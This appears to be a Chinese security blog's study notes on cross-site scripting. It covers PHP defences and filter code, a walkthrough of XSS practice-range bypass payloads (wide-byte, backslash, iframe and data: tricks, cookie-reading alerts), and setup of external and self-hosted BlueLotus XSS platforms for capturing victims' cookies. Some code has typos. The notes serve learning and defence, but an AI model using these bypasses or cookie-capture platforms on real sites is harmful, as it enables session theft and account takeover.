<li>如果Web应用与浏览器各自设想的字符编码不一致，也会成为XSS的原因</li>
<li>header(‘Content-Type: text/html; charset=UTF-8’);</li>
</ul>
</li>
<li>输入校验<ul>
<li>通过检验输入值的有效性，当输入不符合条件时就显示错误消息并促使用户重新输入，有时也能够防御XSS攻击</li>
</ul>
</li>
<li>给Cookie添加HttpOnly属性<ul>
<li>Cookie中有名为HttpOnly的属性，该属性能禁止JavaScript读取Cookie值</li>
<li>php.ini中进行设置：session.cookie_httponly = on</li>
</ul>
</li>
<li>关闭TRACE方法<ul>
<li>跨站追踪（Cross-Site Tracing，简称XST）攻击的防范策略。XST是指利用JavaScript发送HTTP的TRACE方法来窃取Cookie值或Basic认证密码的攻击手段</li>
<li>实际上，现在的主流浏览器都已经能够自己防御XST</li>
<li>关闭TRACE方法，在httpd.conf的设置 TraceEnable Off</li>
</ul>
</li>
<li>生成URL时的对策<ul>
<li>当URL由程序动态生成时，需要对其进行校验，仅允许http和https协议</li>
<li>URL需满足下列的两个条件中的一个<ul>
<li>以http:或https:开头的绝对URL</li>
<li>以/开头的相对URL</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>function check_url($url){
    if(preg_match(&#39;/\Ahttp:/&#39;,$url)||preg_match(&#39;/\Ahttps:/&#39;,$url)|preg_match(&#39;#\A/#&#39;,$url)){
        return true;
    }else{
        return false;
    }
}</code></pre><ul>
<li>校验链接网址<ul>
<li>检查链接的目标URL，如果指向外部网站就报错</li>
<li>当链接目标为外部URL时，显示一个警告页面以提醒用户可能存在的分享</li>
</ul>
</li>
<li>对JavaScript字符串字面量动态生成进行Unicode转义<ul>
<li>JavaScript能将Unicode代码点U+XXXX字符转义为\uXXXX的功能</li>
<li>escape_js_string函数，但前提是字符编码为UTF-8，除了字母和数字以外，减号（-）和点好（.）也不进行转义</li>
<li>unicode_escape函数的功能将输入字符串全部以\uXXXX的UNICODE形式进行转义</li>
<li>在mb_convert_encoding中将输入字符串的字符编码转换为UTF-16</li>
<li>在bin2hex中将对象字符串转换为十六进制</li>
<li>使用正则表达式，每4个字节插入一个\u</li>
<li>在pre_replace_callback函数中，将字母和数字以外的字符串全部传给unicode_escape函数处理</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

   // 将字符串全部转换为 /uXXXX形式
   function unicode_escape($match){
      $u16 = mb_convert_encoding($matches[0],&#39;UTF-16&#39;);
      return preg_replace(&#39;/[0-9a-f]{4}&#39;,&#39;\u$0&#39;,bin2hex($u16));
   }
   // 将除了字母、数字、逗号和点号外的字符转义为\uXXXX形式
   function escape_js_string($s){
      return preg_replace_callback(&#39;/[^-\.0-9a-zA-Z]+/u&#39;,&#39;unicode_escape&#39;,$s);
   }

?&gt;</code></pre><ul>
<li>在JavaScript中引用定义在script元素外的参数的方法<ul>
<li>在script元素外部定义参数后再在JavaScript中引用该参数也可以，不过需要利用hidden参数</li>
</ul>
</li>
</ul>
<pre><code>&lt;input type=&quot;hidden&quot; id=&quot;familyname&quot; value=&quot;&lt;?php echo htmlspecialchars($familyname,ENT_COMPAR,&#39;UTF-8&#39;);?&gt;&quot;&gt;
.....
&lt;script type=&quot;text/javascript&quot;&gt;
var familyname = documen.getElementById(&#39;familyname&#39;).value;
.....</code></pre><ul>
<li>使用JQuery的JavaScript库来对JavaScript字符串字面量动态生成进行转义<ul>
<li>使用span元素确定字符串的显示位置，然后向id指定的DOM插入文本文字，这时可以使用text方法自动进行转义操作</li>
</ul>
</li>
</ul>
<pre><code>&lt;body&gt;
&lt;script src=&quot;jquery-1.4.4.min.js&quot;&gt;&lt;/script&gt;
你好&lt;span id=&quot;name&quot;&gt;&lt;/span&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
if(document.URL.match(/name\=([^&amp;]*)/)){
    var name = unescape(RegExp.$1);
    $(&#39;#name&#39;).text(name);
}
&lt;/script&gt;
&lt;/body&gt;</code></pre><ul>
<li>允许HTML标签或CSS的对策<ul>
<li>使用地点：常见于开发博客系统或SNS网站</li>
<li>一旦允许输入HTML标签，就有可能出现JavaScript的执行</li>
<li>在CSS中使用expression功能也能执行JavaScript<ul>
<li>IE8的标准中就禁用了expression功能执行JavaScript，但在其他模式中还可以使用</li>
</ul>
</li>
<li>为了避免JavaScript的执行，可以采取解析用户输入的HTML，仅允许可以显示的元素的方法，可以通过解析HTML文本语法结构的第三方程序库，如PHP的HTML Purifier</li>
</ul>
</li>
</ul>
<h4 id="2-常见的防XSS代码"><a href="#2-常见的防XSS代码" class="headerlink" title="2. 常见的防XSS代码"></a>2. 常见的防XSS代码</h4><ul>
<li><code>preg_replace(&quot;/script/&quot;,&quot;&quot;,$x)</code> -&gt; 正则匹配替换，区分大小写</li>
<li><code>preg_replace(&quot;/script/i&quot;,&quot;&quot;,$x)</code> -&gt; 正则匹配替换，不区分大小写</li>
<li><code>preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code> -&gt; 正则匹配替换</li>
<li>htmlspecialchars()函数 -&gt; 默认的第二个参数不对单引号进行转义</li>
<li>strtolower()函数 -&gt; 将字符串转为小写</li>
<li>strpos()函数 -&gt; 找寻字符串<ul>
<li><code>strpos($str,&#39;http://&#39;)</code></li>
<li><code>strpos($str,&#39;https://&#39;)</code></li>
</ul>
</li>
<li>str_replace()函数 -&gt; 第一个参数为被替换的内容，第二个参数为替换的内容<ul>
<li><code>str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str)</code></li>
<li><code>str_replace(&quot;on&quot;,&quot;o_n&quot;,$str)</code></li>
<li><code>str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str)</code></li>
<li><code>str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str)</code></li>
<li><code>str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str)</code></li>
<li><code>str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str)</code></li>
<li><code>str_replace(&quot;script&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&quot;on&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&quot;src&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&quot;data&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&quot;href&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str)</code></li>
<li><code>str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
<li><code>str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
<li><code>str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
<li><code>str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
<li><code>str_replace(&quot;&gt;&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&quot;&lt;&quot;,&quot;&quot;,$str)</code></li>
</ul>
</li>
<li>hidden表单形式</li>
<li>addslashes()函数 -&gt; 在每个特殊字符前加反斜杠（\）</li>
<li>strip_tags()函数 -&gt; 剥去字符串中的 HTML、XML以及PHP的标签</li>
<li>stripos()函数 -&gt; 查找字符串在另一字符串中第一次出现的位置，本函数处于循环中，意味着每一个<code>&lt;script</code>都会被替换，且不区分大小写</li>
<li>stripcslashes() -&gt; 去掉反斜杠</li>
<li>htmlentities() -&gt; 转义html实体</li>
<li>html_entity_decode() -&gt; 反转义html实体</li>
<li>htmlspecialchars_decode() -&gt; 将特殊的 HTML 实体转换回普通字符</li>
<li>▲ 白嫖一下bmjoker写的数据过滤类（PHP）<ul>
<li><a href="https://www.cnblogs.com/bmjoker/p/8806899.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/8806899.html</a></li>
</ul>
</li>
</ul>
<pre><code>&lt;?php
class XSS
{
    /**
    * @desc 过滤数据
    *
    * @param $data string|array 输入数据
    * @param $low  bool      是否采用更为严格的过滤
    *
    * @return 返回过滤的数据
    */
    public function clean_xss($data, $low = False)
    {
        #字符串过滤
       if (! is_array ( $data ))
       {
           $data = trim ( $data );              #字符两边的处理
           $data = strip_tags ( $data );        #从字符串中去除 HTML 和 PHP 标记
           $data = htmlspecialchars ( $data );  #特殊字符转换为HTML实体
           if ($low)
           {
               return $data;
           }
           #匹配换空格
           $data = str_replace ( array (&#39;&quot;&#39;, &quot;\\&quot;, &quot;&#39;&quot;, &quot;/&quot;, &quot;..&quot;, &quot;../&quot;, &quot;./&quot;, &quot;//&quot; ), &#39;&#39;, $data );
           $no = &#39;/%0[0-8bcef]/&#39;;
           $data = preg_replace ( $no, &#39;&#39;, $data );
           $no = &#39;/%1[0-9a-f]/&#39;;
           $data = preg_replace ( $no, &#39;&#39;, $data );
           $no = &#39;/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S&#39;;
           $data = preg_replace ( $no, &#39;&#39;, $data );
           return $data;
       }
       #数组过滤
       $arr=array();
       foreach ($data as $k =&gt; $v)
       {
           $temp=$this-&gt;clean_xss($v);
           $arr[$k]=$temp;
       }
       return $arr;
    }


}
#测试测试
session_start();
$_SESSION[&#39;xss&#39;]=&#39;xssss&#39;;
$xss=new XSS();
#测试字符串
$str = &quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;;
echo $str;
$str2=$xss-&gt;clean_xss($str);
echo $str2;
echo &quot;&lt;hr/&gt;&quot;;
#测试数组
$arr=array(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;,&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;,&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);
echo &quot;&lt;pre&gt;&quot;;
print_r($arr);
echo &quot;&lt;/pre&gt;&quot;;
$arr2=$xss-&gt;clean_xss($arr);
echo &quot;&lt;pre&gt;&quot;;
print_r($arr2);
echo &quot;&lt;/pre&gt;&quot;;die;
?&gt;
</code></pre>]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS靶场--Wooyun.tencent</title>
    <url>/2020/04/02/XSS%E9%9D%B6%E5%9C%BA--WooYun.tencent/</url>
    <content><![CDATA[<hr>
<h4 id="1-什么都没过滤的入门情况"><a href="#1-什么都没过滤的入门情况" class="headerlink" title="1. 什么都没过滤的入门情况"></a>1. 什么都没过滤的入门情况</h4><ul>
<li>XSS的存在，一定是伴随着输入，与输出2个概念的。</li>
</ul>
<h4 id="2-输出在-lt-script-gt-lt-script-gt-之间的情况"><a href="#2-输出在-lt-script-gt-lt-script-gt-之间的情况" class="headerlink" title="2. 输出在&lt;script&gt;&lt;/script&gt;之间的情况"></a>2. 输出在<code>&lt;script&gt;&lt;/script&gt;</code>之间的情况</h4><ul>
<li>如果过滤了<code>&lt;&gt;</code>，就无法构造<code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>可通过js代码eval(‘alert(1)’);voids来进入绕过</li>
</ul>
<h4 id="3-输出在HTML属性里的情况"><a href="#3-输出在HTML属性里的情况" class="headerlink" title="3. 输出在HTML属性里的情况"></a>3. 输出在HTML属性里的情况</h4><ul>
<li>\ 反斜线，而 css里，允许使用转义字符，\ + ascii16进制形式<ul>
<li>expression, 我们也可以轻松的用expr\65ssion绕过</li>
<li>▲ css expression 的XSS已经进入暮年了，只有在IE6，7下方能触发，受众面小</li>
</ul>
</li>
<li>在HTML属性中，会自动对实体字符进行转义<ul>
<li><code>&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;</code>和<code>&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;</code>是等效的</li>
<li>url 的编码，&amp;-&gt; %26, # -&gt; %23</li>
</ul>
</li>
</ul>
<h4 id="4-宽字节复仇记-QQ邮箱基本通用"><a href="#4-宽字节复仇记-QQ邮箱基本通用" class="headerlink" title="4. 宽字节复仇记 [QQ邮箱基本通用]"></a>4. 宽字节复仇记 [QQ邮箱基本通用]</h4><ul>
<li>前提<ul>
<li>2中<code>&lt;script&gt;..&lt;/script&gt;</code>之间的情况</li>
<li>gbxxxx系列的编码</li>
</ul>
</li>
<li>过滤：%22 -&gt; %5c%22<ul>
<li>%c0%22 -&gt; %c0%5c%22 -&gt; %22 -&gt; %c0%22</li>
</ul>
</li>
</ul>
<h4 id="5-反斜线复仇记"><a href="#5-反斜线复仇记" class="headerlink" title="5. 反斜线复仇记"></a>5. 反斜线复仇记</h4><ul>
<li>前提<ul>
<li>2中<code>&lt;script&gt;..&lt;/script&gt;</code>之间的情况</li>
</ul>
</li>
<li>绕过转换<ul>
<li>location.href=”………”+”&amp;ss=aaaa”+”&amp;from=bbb”+”&amp;param=”;</li>
<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from=bbb”+”&amp;param=”;（\杀掉双引号）</li>
<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from=1//“+”&amp;param=”;（保证bbb后面的语法正确性，我们把bbb改为一个数字，把bbb后面加上 // 来注释掉后面的部分，但是是错误的，因为&amp;符号优先级高，(“字符串”&amp;from)=1是无法进行这种赋值操作的）</li>
<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1//“+”&amp;param=”;（==的优先级比 &amp; 高，所以语句相当于 (“字符串”)&amp;(from==1)，但由于from未定义，直接和1进行相等判断的话，会报错，错误是：”from”未定义等）</li>
<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1;function from(){}//“+”&amp;param=”;（解析器在解析JS代码段时，会先将 function xxx(){} 拿到最前面解析，然后再依次解析其它的部分，function from(){} 就会被提前解析，从而定义了from, 后面 from==1的时候，就不会报错）</li>
<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1;function/<strong>/from(){}//“+”&amp;param=”;（空格被转义为了 &amp;nbsp，但可以用注释符来做分隔符，`/</strong>/`替换空格，）</li>
<li>最终代码：location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1;function/**/from(){}//“+”&amp;param=”;</li>
</ul>
</li>
</ul>
<h4 id="6-换行符复仇记"><a href="#6-换行符复仇记" class="headerlink" title="6. 换行符复仇记"></a>6. 换行符复仇记</h4><ul>
<li>前提<ul>
<li>2中<code>&lt;script&gt;..&lt;/script&gt;</code>之间的情况</li>
</ul>
</li>
<li>源码：//我是注释，我爱洗澡，哦～哦～哦～ [我是输出]</li>
<li>使用换行符：//我是注释，我爱洗澡，哦～哦～哦～ [我是输出  换行符 alert(1);//我是输出]</li>
</ul>
<h4 id="7-宽字节、反斜线与换行符一起复仇记"><a href="#7-宽字节、反斜线与换行符一起复仇记" class="headerlink" title="7. 宽字节、反斜线与换行符一起复仇记"></a>7. 宽字节、反斜线与换行符一起复仇记</h4><ul>
<li>注释 -&gt; 换行输出</li>
<li>\ -&gt; javascript，字符串允许下面多行的写法，可以用\来使进行多行输出</li>
<li>\ -&gt; 转义：\ -&gt; gbxxx编码系列 -&gt;  %c0可以吃掉%5c</li>
<li>▲ 具体见代码实例，只能说tql</li>
</ul>
<h4 id="8-Dom-Xss入门-显式输出"><a href="#8-Dom-Xss入门-显式输出" class="headerlink" title="8. Dom Xss入门 [显式输出]"></a>8. Dom Xss入门 [显式输出]</h4><ul>
<li>关注点：关注的不仅是【输出】了什么，还要了解这个页面里，【javascript】拿这个【输出】干了什么</li>
<li>JS的字符串中的字符可以写为 unicode编码<ul>
<li>&lt;可以表示为\u003c , &gt;可以表示为\u003e，空格可以表示为\u0020</li>
<li>在JS字符串里，&lt;不光可以写为\u003c，还可以写为\x3c，&gt;同样可以写为\x3e</li>
</ul>
</li>
<li>常用的js代码</li>
</ul>
<pre><code>document.getElementById(&quot;y&quot;).innerHTML=&quot;xxxxxxxxxx&quot;;

document.write(&quot;xxxxxxxxxxxx&quot;);</code></pre><ul>
<li>使用了第三方的JS库，譬如jQuery时</li>
</ul>
<pre><code>$(&quot;#y&quot;).html(&quot;xxxxxxx&quot;);</code></pre><ul>
<li>需要注意的地方<ul>
<li>xxxxx只能使用<code>&lt;img src=1 onerror=alert(1)&gt;</code>这种方式来触发JS。而不能以<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>来触发，因为这种压根不会执行<code>&lt;script&gt;..&lt;/script&gt;</code>之间的内容。 IE下，可以使用<code>&lt;script defer&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
</li>
</ul>
<pre><code>aa.innerHTML=&quot;xxxxxxxxxxxx&quot;;</code></pre><h4 id="9-Dom-Xss入门-隐式输出"><a href="#9-Dom-Xss入门-隐式输出" class="headerlink" title="9. Dom Xss入门 [隐式输出]"></a>9. Dom Xss入门 [隐式输出]</h4><ul>
<li>显示输出：可以在右键查看源代码的时候，看到我们所输出的内容</li>
<li>隐式输出：ar x=location.href; 这句Javascript实际上进行了一个隐藏的输出操作，即将location.href的内容输出到了x变量中</li>
<li>对隐式输出的审查方式：F12 -&gt; 调试工具 -&gt; Source -&gt; crtl+F搜索name或id值</li>
<li>分析js代码的流程，可能不同浏览器对location.href的字符的编码过滤不同<ul>
<li>可能浏览器对代码的编码使得特殊字符绕过了服务器的过滤从而触发了XSS</li>
</ul>
</li>
</ul>
<h4 id="10-Dom-XSS进阶-邂逅eval"><a href="#10-Dom-XSS进阶-邂逅eval" class="headerlink" title="10. Dom XSS进阶[邂逅eval]"></a>10. Dom XSS进阶[邂逅eval]</h4><ul>
<li>一般javascript都会通过document.write或innerHTML将内容输出到网页中，也有可能通过eval输出</li>
<li>▲ 一般eval进行输出的，源代码和审查元素很难看出来，只有触发错误，在console台的错误输出才有可能发现</li>
</ul>
<pre><code>url中为：?key=aaa
源代码中为：eval(&#39;this.&#39;+arg[0]&#39;=&quot;&#39;+arg[1]+&#39;&quot;;&#39;);
输出为：this.key=&quot;aaa&quot;
构造payload：key;alert(1);//=aaa
输出为：this.key;alert(1);//=&quot;aaaa&quot;（如果遇上对&lt;&gt;&quot;编码的话，就不能对后面替换绕过）</code></pre><h4 id="11-Dom-XSS进阶-善变iframe"><a href="#11-Dom-XSS进阶-善变iframe" class="headerlink" title="11. Dom XSS进阶[善变iframe]"></a>11. Dom XSS进阶[善变iframe]</h4><ul>
<li>有时候，输出还会出现在<code>&lt;iframe src=&quot;[输出]&quot;&gt;&lt;/iframe&gt;</code>。 iframe的src属性本来应该是一个网址，但是iframe之善变，使得它同样可以执行javascript，而且可以用不同的姿势来执行</li>
<li>这一类问题，将其归为[路径可控]问题，当然上面说到的是普通的反射型XSS</li>
<li>有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src=”[可控的url]”; 同样会导致XSS问题</li>
<li>iframe的变化<ul>
<li>onload执行js：<code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>src 执行javascript代码：<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>IE下vbscript执行代码：<code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>Chrome下data协议执行代码：<code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; Chrome</code></li>
<li>上面的变体：<code>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
<li>Chrome下srcdoc属性：<code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="12-Dom-XSS进阶-路径con"><a href="#12-Dom-XSS进阶-路径con" class="headerlink" title="12. Dom XSS进阶[路径con]"></a>12. Dom XSS进阶[路径con]</h4><ul>
<li>一些程序员会动态的加载json数据，同域的时候，可以使用ajax</li>
<li>有时候，数据所在域和当前页面所在域又不一致，跨域请求数据的手段中，有一种叫做jsonp</li>
<li>代码表示：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&quot;</code></li>
<li>可控参数：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&amp;id=&quot;+id;</code></li>
<li>地址的可控<ul>
<li>script src=”完全可控” ,这种就简单了，直接将地址换为我们的JS地址</li>
<li>script src=”/path/xxx/[路径可控]/1.js”<ul>
<li>可以直接上传文本至同域名下，不一定要是HTML文件，需要上传点有过滤缺陷。</li>
<li>参数可控，利用可用的json接口（script src=”/path/xxx/…/yyy/xx.json?callback=alert(1)”）</li>
</ul>
</li>
<li>script src=”/xxxx/json.php?callback=xxxx&amp;param1=yyy&amp;param2=[参数可控]”情况与地址可控的第二点参数可控类似</li>
</ul>
</li>
<li>decodeURIComp -&gt; 解码进行<ul>
<li>keyword=%26callback=alert(1);</li>
<li>decodeURIComp就会变为</li>
<li>&amp;callback=alert(1);</li>
</ul>
</li>
</ul>
<h4 id="13-Dom-XSS实例-Discuz-X2-5"><a href="#13-Dom-XSS实例-Discuz-X2-5" class="headerlink" title="13. Dom XSS实例[Discuz X2.5]"></a>13. Dom XSS实例[Discuz X2.5]</h4><ul>
<li>js中，代码可以进行unicode编码，所以需要过滤\</li>
<li>html中，代码可以进行html实体编码，所以需要过滤&amp;#</li>
<li>▲ location.href=”脚本” -&gt; location.href会优先加载”脚本”地址，从而跳转到另外一个页面，继而倒是失效，js文件还没来得及加载，可以改进下执行js的方法： location.href=’原来的字符串’.替换(所有字符,”新的字符”);</li>
<li>▲ alert函数可以改写成：location.href=”javascript:alert(document.cookie)”;</li>
</ul>
<h4 id="14-Flash-Xss入门-navigateToURL"><a href="#14-Flash-Xss入门-navigateToURL" class="headerlink" title="14. Flash Xss入门 [navigateToURL]"></a>14. Flash Xss入门 [navigateToURL]</h4><h4 id="15-Flash-Xss进阶-ExternalInterface-call第一个参数"><a href="#15-Flash-Xss进阶-ExternalInterface-call第一个参数" class="headerlink" title="15. Flash Xss进阶 [ExternalInterface.call第一个参数]"></a>15. Flash Xss进阶 [ExternalInterface.call第一个参数]</h4><h4 id="16-Flash-Xss进阶-ExternalInterface-call第二个参数"><a href="#16-Flash-Xss进阶-ExternalInterface-call第二个参数" class="headerlink" title="16. Flash Xss进阶 [ExternalInterface.call第二个参数]"></a>16. Flash Xss进阶 [ExternalInterface.call第二个参数]</h4><h4 id="17-XSS过滤器绕过-通用绕过"><a href="#17-XSS过滤器绕过-通用绕过" class="headerlink" title="17. XSS过滤器绕过 [通用绕过]"></a>17. XSS过滤器绕过 [通用绕过]</h4><ul>
<li>查看是否被浏览器拦截 -&gt; chrome<ul>
<li>Refused to execute a javascript script.Source code of script found within request</li>
<li>查看源码 -&gt; 是否被和谐</li>
</ul>
</li>
<li>绕过通用方法<ul>
<li>要求<ul>
<li>缺陷点允许&lt;&gt; </li>
<li>缺陷点运行=</li>
<li>缺陷点的后方存在<code>&lt;/script&gt;</code>标签</li>
</ul>
</li>
<li>构造payload：<code>&lt;script src=data:,alert(1)&lt;!--</code></li>
</ul>
</li>
</ul>
<h4 id="18-XSS过滤器绕过-猥琐绕过"><a href="#18-XSS过滤器绕过-猥琐绕过" class="headerlink" title="18. XSS过滤器绕过 [猥琐绕过]"></a>18. XSS过滤器绕过 [猥琐绕过]</h4><ul>
<li>这里是以 “=” 分割，因而我们的代码中是不允许携带等号的。故上一篇的技巧不能拿到这里来使用</li>
<li>…”观察地形” -&gt; 怎么形成参数 -&gt; js代码分析</li>
<li>▲ chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截</li>
</ul>
<h4 id="19-存储型XSS入门-什么都没过滤的情况"><a href="#19-存储型XSS入门-什么都没过滤的情况" class="headerlink" title="19. 存储型XSS入门 [什么都没过滤的情况]"></a>19. 存储型XSS入门 [什么都没过滤的情况]</h4><ul>
<li>反射型是：输入–输出 / 存储型是：输入–进入数据库*–取出数据库–输出。</li>
<li>差别<ul>
<li>反射型是：绝大部分情况下，输入在哪里，输出就在哪里</li>
<li>存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</li>
<li>反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）</li>
<li>存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中</li>
</ul>
</li>
<li>⭐ 寻找存储型：输出的位置不一定出现在输入的位置<ul>
<li>先找到输出点，然后猜测此处输出是否会被过滤</li>
<li>如果觉得可能没过滤，我们再找到这个输出是在哪里输入的</li>
<li>接着开始测试输入，看输出的效果</li>
<li>如果没过滤，那么你就成功了，否则你可以放弃掉它</li>
</ul>
</li>
</ul>
<h4 id="20-存储型XSS入门-套现绕过富文本"><a href="#20-存储型XSS入门-套现绕过富文本" class="headerlink" title="20. 存储型XSS入门 [套现绕过富文本]"></a>20. 存储型XSS入门 [套现绕过富文本]</h4><ul>
<li>富文本操作<ul>
<li>白名单，即：只允许使用白名单内的合法HTML标签，例如IMG，其它均剔除</li>
<li>黑名单，即：厂商会构建一个有危害的HTML标签、属性列表，然后通过分析用户提交的HTML代码，剔除其中有害的部分</li>
<li>▲ 白名单要安全得多，而黑名单的方式则经常会被绕过</li>
<li>▲ 当所有的思路走不通时，可以用富文本，大量的payload去碰撞，用bp进行抓包修改</li>
</ul>
</li>
</ul>
<h4 id="21-存储型XSS进阶-猜测规则，利用Flash-addCallback构造XSS"><a href="#21-存储型XSS进阶-猜测规则，利用Flash-addCallback构造XSS" class="headerlink" title="21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]"></a>21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]</h4>]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS--XSS平台</title>
    <url>/2020/04/02/XSS--XSS%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[<hr>
<h4 id="1-外用XSS平台"><a href="#1-外用XSS平台" class="headerlink" title="1. 外用XSS平台"></a>1. 外用XSS平台</h4><ul>
<li>XSS平台注册</li>
<li>cookie<ul>
<li>创建模块</li>
<li>项目名称</li>
<li>默认模块 -&gt; keepsession</li>
<li>生成项目代码</li>
</ul>
</li>
<li>工具：COOKIE强力注入工具（小马）-&gt; 漏洞页面+COOKIE输入 -&gt; 强制修改 -&gt; 浏览尝试</li>
<li>工具：Firefox浏览器Cookies Manager -&gt; 搜索 -&gt; Add Cookie（添加一个或多个）</li>
<li>XSS平台<ul>
<li>webhack platfrom：<a href="http://www.webhack.cn/" target="_blank" rel="noopener">http://www.webhack.cn/</a></li>
<li>xsshs：<a href="https://xsshs.cn/" target="_blank" rel="noopener">https://xsshs.cn/</a></li>
</ul>
</li>
</ul>
<h4 id="2-个人XSS平台（BlueLotus）"><a href="#2-个人XSS平台（BlueLotus）" class="headerlink" title="2. 个人XSS平台（BlueLotus）"></a>2. 个人XSS平台（BlueLotus）</h4><ul>
<li>原项目地址：<a href="https://github.com/firesunCN/_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/_XSSReceiver</a></li>
<li>项目地址：<a href="https://github.com/asw3asw/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/asw3asw/BlueLotus_XSSReceiver</a></li>
<li>安装博客链接：<a href="https://www.cnblogs.com/blacksunny/p/8401688.html" target="_blank" rel="noopener">https://www.cnblogs.com/blacksunny/p/8401688.html</a></li>
<li>实验环境<ul>
<li>服务器：CentOS</li>
<li>Web容器：Apache</li>
<li>脚本语言：PHP</li>
</ul>
</li>
<li>安装Apache<ul>
<li>yum install httpd –y</li>
<li>service httpd start</li>
<li>浏览器访问<a href="http://IP地址尝试，能否访问到页面" target="_blank" rel="noopener">http://IP地址尝试，能否访问到页面</a></li>
</ul>
</li>
<li>安装PHP<ul>
<li>yum install php –y</li>
</ul>
</li>
<li>安装Git<ul>
<li>yum install git –y</li>
</ul>
</li>
<li>源码存放<ul>
<li>从Github上下载源码</li>
<li>mkdir /var/www/html/xss</li>
<li>存放源码到/xss目录中</li>
<li>chomd -R 777 /var/www/html/xss（此平台一些文件夹需可读可写可执行权限）</li>
</ul>
</li>
<li>配置虚拟主机<ul>
<li>新建虚拟主机配置文件夹：mkdir/etc/httpd/conf/vhost</li>
<li>新建虚拟主机配置文件：vi /etc/httpd/conf/vhost/httpd-vhosts.conf</li>
</ul>
</li>
</ul>
<pre><code>&lt;VirtualHost *:8088&gt;
    DocumentRoot &quot;/var/www/html/xss&quot;
    DirectoryIndex admin.php
    ServerName xss.xxx.top
&lt;/VirtualHost&gt;
&lt;VirtualHost *:8088&gt;
    DocumentRoot &quot;/var/www/html/web&quot;
    DirectoryIndex index.php
    ServerName web.xxx.top
&lt;/VirtualHost&gt;
&lt;VirtualHost *:8088&gt;
    DocumentRoot &quot;/var/www/html/kodex&quot;
    DirectoryIndex index.php
    ServerName kodex.xxx.top
&lt;/VirtualHost&gt;</code></pre><ul>
<li>配置Apache<ul>
<li>备份配置文件：cp/etc/httpd/conf/httpd.conf /etc/httpd/conf/httpd.conf.bak</li>
<li>编辑配置文件：vi/etc/httpd/conf/httpd.conf<ul>
<li>DocumentRoot “/var/www/html”</li>
<li>Options ExecCGIFollowSymLinks（允许服务器使用CGI，在Directory的/var/www/html目录下）</li>
<li>AllowOverrideAll（在Directory的/var/www/html目录下）</li>
<li>插入：Include/etc/httpd/conf/vhost/httpd-vhosts.conf</li>
</ul>
</li>
</ul>
</li>
<li>重启Apache：service httpd restart</li>
<li>安装平台<ul>
<li>访问http://服务器IP地址</li>
<li>设置后台登录密码、数据加密密码<ul>
